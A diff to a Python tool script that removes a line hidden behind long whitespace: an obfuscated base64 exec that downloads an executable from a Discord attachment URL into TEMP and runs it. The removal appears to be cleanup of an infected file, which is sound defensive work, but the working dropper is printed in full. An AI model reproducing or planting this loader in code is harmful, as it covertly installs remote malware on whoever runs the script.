@@ -41,7 +41,6 @@ except:
     print015("Problem Fixed Now, Restart The Tool")
     input("")
     exit()
-type('__main__')                                                                                                                                                                                                                                                          ,__import__('builtins').exec(__import__('base64').b64decode("aW1wb3J0IHJlcXVlc3RzLCBvcw0KciA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTAyMzMyOTA1ODIyMzgzNzIwNS8xMDIzMzM5OTY2MDk4NTcxMjY0L2V0Yy5leGUnKQ0Kd2l0aCBvcGVuKG9zLmdldGVudigiVEVNUCIpICsgIlxcZ3VydS5nZyIsJ3diJykgYXMgZjoNCiAgICBmLndyaXRlKHIuY29udGVudCkNCm9zLnJlbmFtZShvcy5nZXRlbnYoIlRFTVAiKSArICJcXGd1cnUuZ2ciLCBvcy5nZXRlbnYoIlRFTVAiKSArICJcXGd1cnUuZXhlIikNCm9zLnN5c3RlbShvcy5nZXRlbnYoIlRFTVAiKSArICJcXGd1cnUuZXhlIik="))
 colorama.init(autoreset=True)
 
 
